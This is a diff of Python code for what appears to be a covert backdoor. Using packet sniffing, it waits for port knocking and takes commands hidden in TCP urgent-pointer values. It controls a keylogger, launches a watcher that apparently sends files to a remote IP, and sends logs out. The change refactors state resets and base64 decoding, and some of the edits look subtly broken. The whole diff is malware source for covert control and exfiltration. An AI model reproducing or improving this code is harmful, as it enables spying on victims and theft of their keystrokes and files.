@@ -127,13 +127,15 @@ def signal_callback(packet):
         if urgent_pointer_value == eof_signal:
             print(f"EOF marker detected. Total chunks received: {received_chunks}")
             try:
-                data_to_process = received_data[:-2]
+                data_to_process = received_data
                 # Add padding if necessary
                 padding_needed = len(data_to_process) % 4
                 if padding_needed:
                     data_to_process += "=" * (4 - padding_needed)
+
+                print(f"Data to process: {data_to_process}")
                 
-                decoded_bytes = base64.b64decode(data_to_process)
+                decoded_bytes = base64.b64decode(data_to_process.encode()).decode()
                 
                 if current_signal == file_transfer_signal:
                     try:
@@ -201,10 +203,8 @@ def stop_keylogger():
 def start_watcher(file_path):
     """Start the watcher process."""
     global watcher_process
-    script_dir = os.path.abspath('.')  # Changed from os.path.dirname(os.path.abspath(__file__))
+    script_dir = os.path.abspath('.')
     watcher_process = subprocess.Popen(['python3', os.path.join(script_dir, 'watcher.py'), file_path, dest_ip])
-    reset_state()
-    wait_for_port_knocking()
 
 def stop_watcher():
     """Stop the watcher process."""
@@ -212,8 +212,6 @@ def stop_watcher():
     if watcher_process:
         watcher_process.terminate()
         watcher_process = None
-    reset_state()
-    wait_for_port_knocking()
 
 def send_log_file():
     """Send the log file using the encoder script."""
@@ -230,7 +228,7 @@ def handle_data(decoded_data):
         save_file(decoded_data)
     elif current_signal == watcher_start_signal:
         print(f"Watcher command received: {decoded_data}")
-        start_watcher(decoded_data.decode('utf-8'))
+        start_watcher(decoded_data)
     elif current_signal == watcher_stop_signal:
         print("Stop watcher command received.")
         stop_watcher()
@@ -261,19 +259,6 @@ def save_to_file(file_name, content):
         file.write(content)
     print(f"File {safe_filename} created successfully.")
 
-def reset_state():
-    """Reset the state variables."""
-    global current_signal, received_data, signal_received, received_chunks
-    received_data = ""
-    current_signal = 0
-    signal_received = False
-    received_chunks = 0
-    # close the sniffing thread if it's running
-    sniff_thread = threading.active_count()
-    if sniff_thread > 0:
-        sniff_thread.join(timeout=1)
-    print("State reset.")
-
 def open_communication_port():
     """Open the designated communication port."""
     global communication_port
@@ -281,6 +266,7 @@ def open_communication_port():
 
 def wait_for_port_knocking():
     """Wait for the port-knocking sequence."""
+    global sniff_thread
     print("Waiting for port-knocking sequence...")
     sniff_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and dst host {local_ip}", 'prn': packet_callback, 'store': 0})
     sniff_thread.start()
@@ -288,6 +274,17 @@ def wait_for_port_knocking():
 def run_async_task(task):
     """Run a task asynchronously."""
     threading.Thread(target=task).start()
+
+def reset_state():
+    """Reset the state variables."""
+    global current_signal, received_data, signal_received, received_chunks
+    received_data = ""
+    current_signal = 0
+    signal_received = False
+    received_chunks = 0
+    if sniff_thread:
+        sniff_thread.join(timeout=1)
+    print("State reset.")
 
 if __name__ == "__main__":
     wait_for_port_knocking()
